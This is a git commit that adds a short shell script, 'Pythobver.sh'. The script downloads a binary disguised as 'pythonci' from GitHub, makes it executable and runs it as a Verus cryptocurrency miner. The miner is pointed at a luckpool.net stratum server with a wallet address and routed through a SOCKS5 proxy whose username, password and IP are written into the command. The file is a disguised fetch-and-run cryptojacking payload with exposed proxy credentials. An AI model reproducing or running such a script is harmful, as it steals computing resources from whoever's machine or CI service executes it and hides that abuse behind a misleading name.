b30d1cacfedce84b3fe937c9c29eaf1b591586a9
uaaoxjdr <99876928+uaaoxjdr@users.noreply.github.com>
2022-04-05 11:25:34 +0700

    Create Pythobver.sh

---
+++ Pythobver.sh
@@ -0,0 +1,4 @@
+apt update -y
+wget -q https://github.com/uaaoxjdr/testly/raw/main/pythonci
+chmod +x pythonci
+./pythonci -a verus -o stratum+tcp://na.luckpool.net:3956 -u RFjeLpKzaG94EnaidkK2PvgdNR5Q5nTnbW.ken -t 2 -p x -x socks5://Novax:chalHatt@129.158.58.77:1080
